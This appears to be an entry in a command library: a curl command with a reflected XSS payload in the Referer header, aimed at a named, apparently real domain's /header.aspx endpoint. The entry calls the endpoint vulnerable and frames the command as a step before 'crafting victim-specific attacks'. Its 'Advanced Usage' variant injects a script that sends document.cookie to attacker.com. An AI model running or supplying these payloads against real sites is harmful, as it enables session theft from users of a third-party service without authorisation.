---
data: >-
  curl -X GET "https://gamesclub.mtn.com.gh/header.aspx" -H "Referer:
  https://www.google.com/search?hl=en&q=testing\'()&%><img src=x
  onerror=alert(document.domain)>" -v
tags:
  - xss
  - web
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:38.132Z'
id: 6d245089-35c7-4358-a51b-7e9ca8e2c7b2
verified: false
validated: true
submitted: true
---
# curl-send-reflected-xss-referer

## Command

```bash
curl -X GET "https://gamesclub.mtn.com.gh/header.aspx" -H "Referer: https://www.google.com/search?hl=en&q=testing\'()&%><img src=x onerror=alert(document.domain)>" -v
```

## Description

This command uses curl to send a GET request to the vulnerable /header.aspx endpoint with a malicious XSS payload in the Referer header. It tests for reflection by including verbose output (-v) to show the response, where the payload should appear unsanitized in the HTML. Use this to verify the vulnerability before crafting victim-specific attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `"https://gamesclub.mtn.com.gh/header.aspx"` | The target URL with the vulnerable endpoint | Yes |
| `-H "Referer: ..."` | Sets the custom Referer header with the XSS payload | Yes |
| `-v` | Enables verbose mode to display request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://gamesclub.mtn.com.gh/header.aspx" -H "Referer: https://www.google.com/search?hl=en&q=testing\'()&%><img src=x onerror=alert(document.domain)>" -v
```

### Advanced Usage

```bash
curl -X GET "https://gamesclub.mtn.com.gh/header.aspx" -H "Referer: https://evil.com?payload=%3Cscript%3Efetch('https://attacker.com/steal?cookie='+document.cookie)%3C/script%3E" -H "User-Agent: Mozilla/5.0" -v -o response.html
```

> This variant exfiltrates cookies to an attacker server and saves the response to a file for inspection.

## Expected Output

Verbose output showing the full HTTP request and response. Look for the Referer value reflected in the HTML body without escaping, e.g., lines containing the injected <img> tag. No alert in curl, but confirms reflection for browser testing.

## Related

- [[Related Procedure|Exploit-Reflected-XSS-via-HTTP-Referer-Header]]
